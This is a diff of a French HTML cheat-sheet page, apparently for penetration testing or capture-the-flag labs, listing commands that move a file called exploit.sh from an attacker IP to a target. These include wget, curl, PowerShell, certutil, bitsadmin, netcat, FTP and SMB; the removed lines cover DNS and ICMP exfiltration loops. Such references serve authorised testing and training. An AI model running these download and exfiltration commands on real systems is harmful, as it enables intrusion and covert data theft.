@@ -137,9 +137,7 @@
                             <div class="config-item">
                                 <label>Système d'exploitation</label>
                                 <select id="attackerOS" class="config-select">
-                                    <option value="kali">🐉 Kali Linux</option>
-                                    <option value="ubuntu">🐧 Ubuntu/Debian</option>
-                                    <option value="arch">🏔️ Arch Linux</option>
+                                    <option value="unix">🐧 Unix/Linux</option>
                                     <option value="windows">🪟 Windows</option>
                                     <option value="macos">🍎 macOS</option>
                                 </select>
@@ -209,10 +207,12 @@
             <!-- HTTP Transfer -->
             <div class="method-card" data-method="http">
                 <div class="method-header">
-                    <div class="method-icon">🌐</div>
-                    <div class="method-info">
-                        <h3>Serveur HTTP</h3>
-                        <p>Méthode la plus simple et universelle</p>
+                    <div class="method-header-left">
+                        <div class="method-icon">🌐</div>
+                        <div class="method-info">
+                            <h3>Serveur HTTP</h3>
+                            <p>Méthode la plus simple et universelle</p>
+                        </div>
                     </div>
                     <div class="method-badges">
                         <span class="badge badge-recommended">Recommandé</span>
@@ -231,7 +231,7 @@
                                 <div class="command-variants">
                                     <div class="command-block">
                                         <div class="command-label">Python 3 (recommandé)</div>
-                                        <code id="httpServerPython3">python3 -m http.server 8000</code>
+                                        <code id="httpServerPython3">python3 -m http.server 8000 --bind 0.0.0.0</code>
                                         <button class="copy-btn" onclick="copyCommand('httpServerPython3')">📋</button>
                                     </div>
                                     <div class="command-block">
@@ -251,7 +251,7 @@
                                     </div>
                                     <div class="command-block">
                                         <div class="command-label">Node.js</div>
-                                        <code id="httpServerNode">npx http-server -p 8000</code>
+                                        <code id="httpServerNode">npx http-server -p 8000 --host 0.0.0.0</code>
                                         <button class="copy-btn" onclick="copyCommand('httpServerNode')">📋</button>
                                     </div>
                                 </div>
@@ -265,119 +265,32 @@
                                 <p class="step-description">
                                     Téléchargez le fichier depuis votre serveur HTTP
                                 </p>
-                                <div class="os-specific-commands">
-                                    <div class="os-tab-group">
-                                        <button class="os-tab active" data-os="linux">🐧 Linux</button>
-                                        <button class="os-tab" data-os="windows">🪟 Windows</button>
-                                        <button class="os-tab" data-os="macos">🍎 macOS</button>
-                                    </div>
-                                    
-                                    <div class="os-content active" data-os-content="linux">
-                                        <div class="command-block">
-                                            <div class="command-label">wget (le plus courant)</div>
-                                            <code id="httpClientWget">wget http://10.10.14.1:8000/exploit.sh</code>
-                                            <button class="copy-btn" onclick="copyCommand('httpClientWget')">📋</button>
-                                        </div>
-                                        <div class="command-block">
-                                            <div class="command-label">curl (alternative)</div>
-                                            <code id="httpClientCurl">curl -O http://10.10.14.1:8000/exploit.sh</code>
-                                            <button class="copy-btn" onclick="copyCommand('httpClientCurl')">📋</button>
-                                        </div>
-                                        <div class="command-block">
-                                            <div class="command-label">wget silencieux</div>
-                                            <code id="httpClientWgetQuiet">wget -q http://10.10.14.1:8000/exploit.sh</code>
-                                            <button class="copy-btn" onclick="copyCommand('httpClientWgetQuiet')">📋</button>
-                                        </div>
-                                    </div>
-                                    
-                                    <div class="os-content" data-os-content="windows">
-                                        <div class="command-block">
-                                            <div class="command-label">PowerShell (Windows 10+)</div>
-                                            <code id="httpClientPowershell">Invoke-WebRequest -Uri "http://10.10.14.1:8000/exploit.sh" -OutFile "exploit.sh"</code>
-                                            <button class="copy-btn" onclick="copyCommand('httpClientPowershell')">📋</button>
-                                        </div>
-                                        <div class="command-block">
-                                            <div class="command-label">PowerShell court</div>
-                                            <code id="httpClientPowershellShort">iwr -uri "http://10.10.14.1:8000/exploit.sh" -o "exploit.sh"</code>
-                                            <button class="copy-btn" onclick="copyCommand('httpClientPowershellShort')">📋</button>
-                                        </div>
-                                        <div class="command-block">
-                                            <div class="command-label">certutil (Windows legacy)</div>
-                                            <code id="httpClientCertutil">certutil -urlcache -split -f "http://10.10.14.1:8000/exploit.sh" exploit.sh</code>
-                                            <button class="copy-btn" onclick="copyCommand('httpClientCertutil')">📋</button>
-                                        </div>
-                                        <div class="command-block">
-                                            <div class="command-label">bitsadmin (Windows legacy)</div>
-                                            <code id="httpClientBitsadmin">bitsadmin /transfer myDownloadJob /download /priority normal http://10.10.14.1:8000/exploit.sh C:\temp\exploit.sh</code>
-                                            <button class="copy-btn" onclick="copyCommand('httpClientBitsadmin')">📋</button>
-                                        </div>
-                                    </div>
-                                    
-                                    <div class="os-content" data-os-content="macos">
-                                        <div class="command-block">
-                                            <div class="command-label">curl (natif macOS)</div>
-                                            <code id="httpClientMacOS">curl -O http://10.10.14.1:8000/exploit.sh</code>
-                                            <button class="copy-btn" onclick="copyCommand('httpClientMacOS')">📋</button>
-                                        </div>
-                                    </div>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-
-            <!-- FTP Transfer -->
-            <div class="method-card" data-method="ftp">
-                <div class="method-header">
-                    <div class="method-icon">📂</div>
-                    <div class="method-info">
-                        <h3>Serveur FTP</h3>
-                        <p>Transfert via protocole FTP</p>
-                    </div>
-                    <div class="method-badges">
-                        <span class="badge badge-network">Réseau</span>
-                        <span class="badge badge-auth">Authentification</span>
-                    </div>
-                </div>
-                <div class="method-content">
-                    <div class="step-by-step">
-                        <div class="step">
-                            <div class="step-number">1</div>
-                            <div class="step-content">
-                                <h4>🖥️ Sur votre machine attaquant</h4>
-                                <p class="step-description">
-                                    Démarrez un serveur FTP temporaire
-                                </p>
                                 <div class="command-variants">
                                     <div class="command-block">
-                                        <div class="command-label">Python pyftpdlib</div>
-                                        <code id="ftpServerPython">python3 -m pyftpdlib -p 21 -w</code>
-                                        <button class="copy-btn" onclick="copyCommand('ftpServerPython')">📋</button>
+                                        <div class="command-label">wget (Linux/macOS)</div>
+                                        <code id="httpClientWget">wget "http://10.10.14.1:8000/exploit.sh" -O "/tmp/exploit.sh"</code>
+                                        <button class="copy-btn" onclick="copyCommand('httpClientWget')">📋</button>
                                     </div>
                                     <div class="command-block">
-                                        <div class="command-label">Pure-FTPd (Linux)</div>
-                                        <code id="ftpServerPure">pure-ftpd -j -P 10.10.14.1 -p 30000:30009</code>
-                                        <button class="copy-btn" onclick="copyCommand('ftpServerPure')">📋</button>
+                                        <div class="command-label">curl (Linux/macOS)</div>
+                                        <code id="httpClientCurl">curl -o "/tmp/exploit.sh" "http://10.10.14.1:8000/exploit.sh"</code>
+                                        <button class="copy-btn" onclick="copyCommand('httpClientCurl')">📋</button>
                                     </div>
-                                </div>
-                            </div>
-                        </div>
-
-                        <div class="step">
-                            <div class="step-number">2</div>
-                            <div class="step-content">
-                                <h4>🎯 Sur la machine cible</h4>
-                                <p class="step-description">
-                                    Connectez-vous au serveur FTP et téléchargez
-                                </p>
-                                <div class="command-block">
-                                    <div class="command-label">Client FTP</div>
-                                    <code id="ftpClient">ftp 10.10.14.1</code>
-                                    <button class="copy-btn" onclick="copyCommand('ftpClient')">📋</button>
-                                </div>
-                                <div class="step-note">
-                                    💡 Puis utilisez: get exploit.sh
+                                    <div class="command-block">
+                                        <div class="command-label">PowerShell (Windows)</div>
+                                        <code id="httpClientPowershell">Invoke-WebRequest -Uri "http://10.10.14.1:8000/exploit.sh" -OutFile "C:\temp\exploit.sh"</code>
+                                        <button class="copy-btn" onclick="copyCommand('httpClientPowershell')">📋</button>
+                                    </div>
+                                    <div class="command-block">
+                                        <div class="command-label">certutil (Windows)</div>
+                                        <code id="httpClientCertutil">certutil -urlcache -split -f "http://10.10.14.1:8000/exploit.sh" "C:\temp\exploit.sh"</code>
+                                        <button class="copy-btn" onclick="copyCommand('httpClientCertutil')">📋</button>
+                                    </div>
+                                    <div class="command-block">
+                                        <div class="command-label">bitsadmin (Windows)</div>
+                                        <code id="httpClientBitsadmin">bitsadmin /transfer myDownloadJob /download /priority normal "http://10.10.14.1:8000/exploit.sh" "C:\temp\exploit.sh"</code>
+                                        <button class="copy-btn" onclick="copyCommand('httpClientBitsadmin')">📋</button>
+                                    </div>
                                 </div>
                             </div>
                         </div>
@@ -385,17 +298,20 @@
                 </div>
             </div>
 
-            <!-- SCP/SFTP Transfer -->
+            <!-- SCP Transfer -->
             <div class="method-card" data-method="scp">
                 <div class="method-header">
-                    <div class="method-icon">🔐</div>
-                    <div class="method-info">
-                        <h3>SCP/SFTP</h3>
-                        <p>Transfert sécurisé via SSH</p>
+                    <div class="method-header-left">
+                        <div class="method-icon">🔐</div>
+                        <div class="method-info">
+                            <h3>SCP/SFTP</h3>
+                            <p>Transfert sécurisé via SSH</p>
+                        </div>
                     </div>
                     <div class="method-badges">
                         <span class="badge badge-secure">Sécurisé</span>
                         <span class="badge badge-ssh">SSH</span>
+                        <span class="badge badge-auth">Auth requise</span>
                     </div>
                 </div>
                 <div class="method-content">
@@ -403,26 +319,29 @@
                         <div class="step">
                             <div class="step-number">1</div>
                             <div class="step-content">
-                                <h4>🔄 Transfert bidirectionnel</h4>
+                                <h4>🖥️ Depuis votre machine attaquant</h4>
                                 <p class="step-description">
-                                    Utilisez SCP pour transférer des fichiers via SSH
+                                    Copiez directement le fichier via SCP (nécessite SSH activé sur la cible)
                                 </p>
                                 <div class="command-variants">
                                     <div class="command-block">
-                                        <div class="command-label">Upload vers la cible</div>
-                                        <code id="scpUpload">scp exploit.sh user@10.10.14.1:/tmp/</code>
-                                        <button class="copy-btn" onclick="copyCommand('scpUpload')">📋</button>
+                                        <div class="command-label">SCP vers la cible</div>
+                                        <code id="scpToTarget">scp "exploit.sh" user@target_ip:"/tmp/exploit.sh"</code>
+                                        <button class="copy-btn" onclick="copyCommand('scpToTarget')">📋</button>
                                     </div>
                                     <div class="command-block">
-                                        <div class="command-label">Download depuis la cible</div>
-                                        <code id="scpDownload">scp user@10.10.14.1:/tmp/exploit.sh .</code>
-                                        <button class="copy-btn" onclick="copyCommand('scpDownload')">📋</button>
+                                        <div class="command-label">SCP avec port personnalisé</div>
+                                        <code id="scpCustomPort">scp -P 2222 "exploit.sh" user@target_ip:"/tmp/exploit.sh"</code>
+                                        <button class="copy-btn" onclick="copyCommand('scpCustomPort')">📋</button>
                                     </div>
                                     <div class="command-block">
                                         <div class="command-label">SFTP interactif</div>
-                                        <code id="sftpConnect">sftp user@10.10.14.1</code>
-                                        <button class="copy-btn" onclick="copyCommand('sftpConnect')">📋</button>
+                                        <code id="sftpInteractive">sftp user@target_ip</code>
+                                        <button class="copy-btn" onclick="copyCommand('sftpInteractive')">📋</button>
                                     </div>
+                                </div>
+                                <div class="step-note">
+                                    💡 <strong>Note :</strong> Remplacez "user" et "target_ip" par les vraies valeurs. SSH doit être activé sur la cible.
                                 </div>
                             </div>
                         </div>
@@ -433,14 +352,16 @@
             <!-- Netcat Transfer -->
             <div class="method-card" data-method="netcat">
                 <div class="method-header">
-                    <div class="method-icon">🔌</div>
-                    <div class="method-info">
-                        <h3>Netcat (nc)</h3>
-                        <p>Transfert direct via socket TCP</p>
+                    <div class="method-header-left">
+                        <div class="method-icon">🔌</div>
+                        <div class="method-info">
+                            <h3>Netcat</h3>
+                            <p>Transfert direct via TCP</p>
+                        </div>
                     </div>
                     <div class="method-badges">
                         <span class="badge badge-fast">Rapide</span>
-                        <span class="badge badge-stealth">Discret</span>
+                        <span class="badge badge-network">Réseau</span>
                     </div>
                 </div>
                 <div class="method-content">
@@ -448,20 +369,15 @@
                         <div class="step">
                             <div class="step-number">1</div>
                             <div class="step-content">
-                                <h4>🖥️ Sur votre machine attaquant</h4>
+                                <h4>🎯 Sur la machine cible (récepteur)</h4>
                                 <p class="step-description">
-                                    Configurez netcat pour envoyer le fichier
+                                    Démarrez netcat en mode écoute pour recevoir le fichier
                                 </p>
                                 <div class="command-variants">
                                     <div class="command-block">
-                                        <div class="command-label">Envoi du fichier</div>
-                                        <code id="ncSender">nc -lvnp 8000 < exploit.sh</code>
-                                        <button class="copy-btn" onclick="copyCommand('ncSender')">📋</button>
-                                    </div>
-                                    <div class="command-block">
-                                        <div class="command-label">Netcat traditionnel</div>
-                                        <code id="ncSenderTraditional">nc -l -p 8000 < exploit.sh</code>
-                                        <button class="copy-btn" onclick="copyCommand('ncSenderTraditional')">📋</button>
+                                        <div class="command-label">Netcat récepteur</div>
+                                        <code id="netcatReceiver">nc -l -p 8000 > "/tmp/exploit.sh"</code>
+                                        <button class="copy-btn" onclick="copyCommand('netcatReceiver')">📋</button>
                                     </div>
                                 </div>
                             </div>
@@ -470,14 +386,21 @@
                         <div class="step">
                             <div class="step-number">2</div>
                             <div class="step-content">
-                                <h4>🎯 Sur la machine cible</h4>
+                                <h4>🖥️ Sur votre machine attaquant (envoyeur)</h4>
                                 <p class="step-description">
-                                    Connectez-vous et recevez le fichier
+                                    Envoyez le fichier vers la cible
                                 </p>
-                                <div class="command-block">
-                                    <div class="command-label">Réception du fichier</div>
-                                    <code id="ncReceiver">nc 10.10.14.1 8000 > exploit.sh</code>
-                                    <button class="copy-btn" onclick="copyCommand('ncReceiver')">📋</button>
+                                <div class="command-variants">
+                                    <div class="command-block">
+                                        <div class="command-label">Netcat envoyeur</div>
+                                        <code id="netcatSender">nc target_ip 8000 < "exploit.sh"</code>
+                                        <button class="copy-btn" onclick="copyCommand('netcatSender')">📋</button>
+                                    </div>
+                                    <div class="command-block">
+                                        <div class="command-label">Avec timeout</div>
+                                        <code id="netcatTimeout">timeout 30 nc target_ip 8000 < "exploit.sh"</code>
+                                        <button class="copy-btn" onclick="copyCommand('netcatTimeout')">📋</button>
+                                    </div>
                                 </div>
                             </div>
                         </div>
@@ -488,14 +411,16 @@
             <!-- Base64 Transfer -->
             <div class="method-card" data-method="base64">
                 <div class="method-header">
-                    <div class="method-icon">🔤</div>
-                    <div class="method-info">
-                        <h3>Encodage Base64</h3>
-                        <p>Pour petits fichiers via copier-coller</p>
+                    <div class="method-header-left">
+                        <div class="method-icon">📝</div>
+                        <div class="method-info">
+                            <h3>Base64</h3>
+                            <p>Transfert via copier-coller de texte</p>
+                        </div>
                     </div>
                     <div class="method-badges">
-                        <span class="badge badge-stealth">Très discret</span>
                         <span class="badge badge-manual">Manuel</span>
+                        <span class="badge badge-stealth">Discret</span>
                     </div>
                 </div>
                 <div class="method-content">
@@ -505,27 +430,19 @@
                             <div class="step-content">
                                 <h4>🖥️ Sur votre machine attaquant</h4>
                                 <p class="step-description">
-                                    Encodez le fichier en Base64
+                                    Encodez le fichier en base64
                                 </p>
                                 <div class="command-variants">
                                     <div class="command-block">
-                                        <div class="command-label">Encodage Base64 (Linux)</div>
-                                        <code id="base64Encode">base64 -w 0 exploit.sh</code>
+                                        <div class="command-label">Encoder en base64 (Linux/macOS)</div>
+                                        <code id="base64Encode">base64 -w 0 "exploit.sh"</code>
                                         <button class="copy-btn" onclick="copyCommand('base64Encode')">📋</button>
                                     </div>
                                     <div class="command-block">
-                                        <div class="command-label">Encodage Base64 (macOS)</div>
-                                        <code id="base64EncodeMac">base64 -i exploit.sh</code>
-                                        <button class="copy-btn" onclick="copyCommand('base64EncodeMac')">📋</button>
+                                        <div class="command-label">Encoder en base64 (Windows)</div>
+                                        <code id="base64EncodeWin">certutil -encode "exploit.sh" encoded.txt</code>
+                                        <button class="copy-btn" onclick="copyCommand('base64EncodeWin')">📋</button>
                                     </div>
-                                    <div class="command-block">
-                                        <div class="command-label">PowerShell Base64</div>
-                                        <code id="base64EncodePowershell">[Convert]::ToBase64String([IO.File]::ReadAllBytes("exploit.sh"))</code>
-                                        <button class="copy-btn" onclick="copyCommand('base64EncodePowershell')">📋</button>
-                                    </div>
-                                </div>
-                                <div class="step-note">
-                                    💡 Copiez la sortie de cette commande
                                 </div>
                             </div>
                         </div>
@@ -537,30 +454,81 @@
                                 <p class="step-description">
                                     Décodez et sauvegardez le fichier
                                 </p>
-                                <div class="os-specific-commands">
-                                    <div class="os-tab-group">
-                                        <button class="os-tab active" data-os="linux">🐧 Linux</button>
-                                        <button class="os-tab" data-os="windows">🪟 Windows</button>
+                                <div class="command-variants">
+                                    <div class="command-block">
+                                        <div class="command-label">Décoder base64 (Linux/macOS)</div>
+                                        <code id="base64Decode">echo "BASE64_STRING" | base64 -d > "/tmp/exploit.sh"</code>
+                                        <button class="copy-btn" onclick="copyCommand('base64Decode')">📋</button>
                                     </div>
-                                    
-                                    <div class="os-content active" data-os-content="linux">
-                                        <div class="command-block">
-                                            <div class="command-label">Décodage Base64</div>
-                                            <code id="base64Decode">echo "PASTE_BASE64_HERE" | base64 -d > exploit.sh</code>
-                                            <button class="copy-btn" onclick="copyCommand('base64Decode')">📋</button>
-                                        </div>
-                                    </div>
-                                    
-                                    <div class="os-content" data-os-content="windows">
-                                        <div class="command-block">
-                                            <div class="command-label">PowerShell décodage</div>
-                                            <code id="base64DecodePowershell">[IO.File]::WriteAllBytes("exploit.sh", [Convert]::FromBase64String("PASTE_BASE64_HERE"))</code>
-                                            <button class="copy-btn" onclick="copyCommand('base64DecodePowershell')">📋</button>
-                                        </div>
+                                    <div class="command-block">
+                                        <div class="command-label">Décoder base64 (Windows)</div>
+                                        <code id="base64DecodeWin">certutil -decode encoded.txt "C:\temp\exploit.sh"</code>
+                                        <button class="copy-btn" onclick="copyCommand('base64DecodeWin')">📋</button>
                                     </div>
                                 </div>
-                                <div class="step-note">
-                                    💡 Remplacez PASTE_BASE64_HERE par le contenu copié
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- FTP Transfer -->
+            <div class="method-card" data-method="ftp">
+                <div class="method-header">
+                    <div class="method-header-left">
+                        <div class="method-icon">📁</div>
+                        <div class="method-info">
+                            <h3>Serveur FTP</h3>
+                            <p>Transfert via protocole FTP</p>
+                        </div>
+                    </div>
+                    <div class="method-badges">
+                        <span class="badge badge-network">Réseau</span>
+                        <span class="badge badge-auth">Auth optionnelle</span>
+                    </div>
+                </div>
+                <div class="method-content">
+                    <div class="step-by-step">
+                        <div class="step">
+                            <div class="step-number">1</div>
+                            <div class="step-content">
+                                <h4>🖥️ Sur votre machine attaquant</h4>
+                                <p class="step-description">
+                                    Démarrez un serveur FTP
+                                </p>
+                                <div class="command-variants">
+                                    <div class="command-block">
+                                        <div class="command-label">Python FTP Server</div>
+                                        <code id="ftpServerPython">python3 -m pyftpdlib -p 21 -w</code>
+                                        <button class="copy-btn" onclick="copyCommand('ftpServerPython')">📋</button>
+                                    </div>
+                                    <div class="command-block">
+                                        <div class="command-label">FTP avec authentification</div>
+                                        <code id="ftpServerAuth">python3 -m pyftpdlib -p 21 -u user -P pass</code>
+                                        <button class="copy-btn" onclick="copyCommand('ftpServerAuth')">📋</button>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="step">
+                            <div class="step-number">2</div>
+                            <div class="step-content">
+                                <h4>🎯 Sur la machine cible</h4>
+                                <p class="step-description">
+                                    Téléchargez le fichier via FTP
+                                </p>
+                                <div class="command-variants">
+                                    <div class="command-block">
+                                        <div class="command-label">FTP client (Linux)</div>
+                                        <code id="ftpClientLinux">wget ftp://10.10.14.1/exploit.sh -O "/tmp/exploit.sh"</code>
+                                        <button class="copy-btn" onclick="copyCommand('ftpClientLinux')">📋</button>
+                                    </div>
+                                    <div class="command-block">
+                                        <div class="command-label">FTP client (Windows)</div>
+                                        <code id="ftpClientWindows">powershell -c "(New-Object Net.WebClient).DownloadFile('ftp://10.10.14.1/exploit.sh', 'C:\temp\exploit.sh')"</code>
+                                        <button class="copy-btn" onclick="copyCommand('ftpClientWindows')">📋</button>
+                                    </div>
                                 </div>
                             </div>
                         </div>
@@ -571,10 +539,12 @@
             <!-- SMB Transfer -->
             <div class="method-card" data-method="smb">
                 <div class="method-header">
-                    <div class="method-icon">📁</div>
-                    <div class="method-info">
-                        <h3>Partage SMB</h3>
-                        <p>Idéal pour environnements Windows</p>
+                    <div class="method-header-left">
+                        <div class="method-icon">🗂️</div>
+                        <div class="method-info">
+                            <h3>Partage SMB</h3>
+                            <p>Transfert via partage réseau Windows</p>
+                        </div>
                     </div>
                     <div class="method-badges">
                         <span class="badge badge-windows">Windows</span>
@@ -588,7 +558,7 @@
                             <div class="step-content">
                                 <h4>🖥️ Sur votre machine attaquant</h4>
                                 <p class="step-description">
-                                    Créez un partage SMB temporaire
+                                    Créez un partage SMB
                                 </p>
                                 <div class="command-variants">
                                     <div class="command-block">
@@ -598,7 +568,7 @@
                                     </div>
                                     <div class="command-block">
                                         <div class="command-label">SMB avec authentification</div>
-                                        <code id="smbServerAuth">impacket-smbserver share . -smb2support -user test -password test</code>
+                                        <code id="smbServerAuth">impacket-smbserver share . -smb2support -user user -password pass</code>
                                         <button class="copy-btn" onclick="copyCommand('smbServerAuth')">📋</button>
                                     </div>
                                 </div>
@@ -615,110 +585,14 @@
                                 <div class="command-variants">
                                     <div class="command-block">
                                         <div class="command-label">Copie depuis SMB</div>
-                                        <code id="smbCopy">copy \\10.10.14.1\share\exploit.sh .</code>
+                                        <code id="smbCopy">copy "\\10.10.14.1\share\exploit.sh" "C:\temp\exploit.sh"</code>
                                         <button class="copy-btn" onclick="copyCommand('smbCopy')">📋</button>
                                     </div>
                                     <div class="command-block">
                                         <div class="command-label">Robocopy (plus robuste)</div>
-                                        <code id="smbRobocopy">robocopy \\10.10.14.1\share . exploit.sh</code>
+                                        <code id="smbRobocopy">robocopy "\\10.10.14.1\share" "C:\temp" "exploit.sh"</code>
                                         <button class="copy-btn" onclick="copyCommand('smbRobocopy')">📋</button>
                                     </div>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-
-            <!-- DNS Exfiltration -->
-            <div class="method-card" data-method="dns">
-                <div class="method-header">
-                    <div class="method-icon">🌐</div>
-                    <div class="method-info">
-                        <h3>Exfiltration DNS</h3>
-                        <p>Transfert via requêtes DNS (très discret)</p>
-                    </div>
-                    <div class="method-badges">
-                        <span class="badge badge-stealth">Ultra discret</span>
-                        <span class="badge badge-advanced">Avancé</span>
-                    </div>
-                </div>
-                <div class="method-content">
-                    <div class="step-by-step">
-                        <div class="step">
-                            <div class="step-number">1</div>
-                            <div class="step-content">
-                                <h4>🖥️ Sur votre machine attaquant</h4>
-                                <p class="step-description">
-                                    Configurez un serveur DNS pour recevoir les données
-                                </p>
-                                <div class="command-block">
-                                    <div class="command-label">Serveur DNS simple</div>
-                                    <code id="dnsServer">sudo tcpdump -i any -s 0 port 53</code>
-                                    <button class="copy-btn" onclick="copyCommand('dnsServer')">📋</button>
-                                </div>
-                            </div>
-                        </div>
-
-                        <div class="step">
-                            <div class="step-number">2</div>
-                            <div class="step-content">
-                                <h4>🎯 Sur la machine cible</h4>
-                                <p class="step-description">
-                                    Exfiltrez le fichier via requêtes DNS
-                                </p>
-                                <div class="command-block">
-                                    <div class="command-label">Exfiltration DNS</div>
-                                    <code id="dnsExfil">for i in $(base64 -w 0 exploit.sh | fold -w 32); do nslookup $i.10.10.14.1; done</code>
-                                    <button class="copy-btn" onclick="copyCommand('dnsExfil')">📋</button>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-
-            <!-- ICMP Exfiltration -->
-            <div class="method-card" data-method="icmp">
-                <div class="method-header">
-                    <div class="method-icon">📡</div>
-                    <div class="method-info">
-                        <h3>Exfiltration ICMP</h3>
-                        <p>Transfert via paquets ping</p>
-                    </div>
-                    <div class="method-badges">
-                        <span class="badge badge-stealth">Très discret</span>
-                        <span class="badge badge-creative">Créatif</span>
-                    </div>
-                </div>
-                <div class="method-content">
-                    <div class="step-by-step">
-                        <div class="step">
-                            <div class="step-number">1</div>
-                            <div class="step-content">
-                                <h4>🖥️ Sur votre machine attaquant</h4>
-                                <p class="step-description">
-                                    Écoutez les paquets ICMP
-                                </p>
-                                <div class="command-block">
-                                    <div class="command-label">Capture ICMP</div>
-                                    <code id="icmpListen">sudo tcpdump -i any icmp</code>
-                                    <button class="copy-btn" onclick="copyCommand('icmpListen')">📋</button>
-                                </div>
-                            </div>
-                        </div>
-
-                        <div class="step">
-                            <div class="step-number">2</div>
-                            <div class="step-content">
-                                <h4>🎯 Sur la machine cible</h4>
-                                <p class="step-description">
-                                    Envoyez le fichier via ping
-                                </p>
-                                <div class="command-block">
-                                    <div class="command-label">Exfiltration ICMP</div>
-                                    <code id="icmpExfil">xxd -p -c 16 exploit.sh | while read line; do ping -c 1 -p $line 10.10.14.1; done</code>
-                                    <button class="copy-btn" onclick="copyCommand('icmpExfil')">📋</button>
                                 </div>
                             </div>
                         </div>
@@ -739,6 +613,7 @@
                     <div class="history-empty">
                         <span class="empty-icon">📝</span>
                         <p>Aucune commande copiée pour le moment</p>
+                        <p class="empty-subtitle">Les commandes que vous copiez apparaîtront ici avec leur contexte</p>
                     </div>
                 </div>
             </div>
